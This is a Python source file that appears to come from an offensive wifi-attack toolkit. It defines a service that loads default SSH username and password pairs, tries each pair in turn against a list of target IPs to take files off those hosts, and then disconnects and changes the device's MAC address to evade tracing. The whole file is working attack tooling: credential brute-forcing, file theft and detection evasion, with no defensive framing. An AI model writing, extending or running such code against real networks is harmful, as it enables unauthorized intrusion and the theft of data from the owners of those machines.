import os
import time
from attacks.file_stealer import FileStealer
from utils.logger import Logger

class FileStealerService:
    def __init__(self, wifi_service, logger=None, creds_path="config/ssh_default_credentials.txt"):
        self.logger = logger or Logger(log_file="logs/scan.log")
        self.wifi_service = wifi_service
        self.stealer = FileStealer(logger=self.logger)
        self.creds = self._load_credentials(creds_path)

    def _load_credentials(self, path):
        creds = []
        for p in (path, "/root/ssh_default_credentials.txt"):
            if os.path.exists(p):
                with open(p, encoding="utf-8", errors="replace") as f:
                    for line in f:
                        parts = line.strip().split(":", 1)
                        if len(parts) == 2:
                            creds.append({"username": parts[0], "password": parts[1]})
                break
        self.logger.log(f"[INFO] Loaded {len(creds)} SSH credential(s).")
        return creds

    def steal(self, targets, ssid="unknown"):
        succeeded = []
        for t in targets:
            ip = t["ip"]
            self.logger.activity(
                "file_steal", ssid,
                f"Attempting file steal on {ip}...",
                status="running"
            )
            for cred in self.creds:
                ok = self.stealer.steal_files(
                    target_ip=ip,
                    username=cred["username"],
                    password=cred["password"],
                    os_type=t.get("os_version")
                )
                if ok:
                    succeeded.append(ip)
                    self.logger.log(f"[SUCCESS] File stealing successful for IP: {ip}. Rotating MAC.")
                    self.logger.activity(
                        "file_steal", ssid,
                        f"Files stolen from {ip}",
                        status="success",
                        details={"ip": ip}
                    )
                    # Use the active interface — fall back to wlan0 if unset
                    iface = getattr(self.wifi_service.manager, "interface", "wlan0") or "wlan0"
                    self.wifi_service.disconnect()
                    self.wifi_service.change_mac(interface=iface)
                    time.sleep(1)
                    break
            else:
                self.logger.activity(
                    "file_steal", ssid,
                    f"No files stolen from {ip}",
                    status="error"
                )

        self.logger.log(f"[INFO] File stealing succeeded on {len(succeeded)} host(s).")
        return succeeded
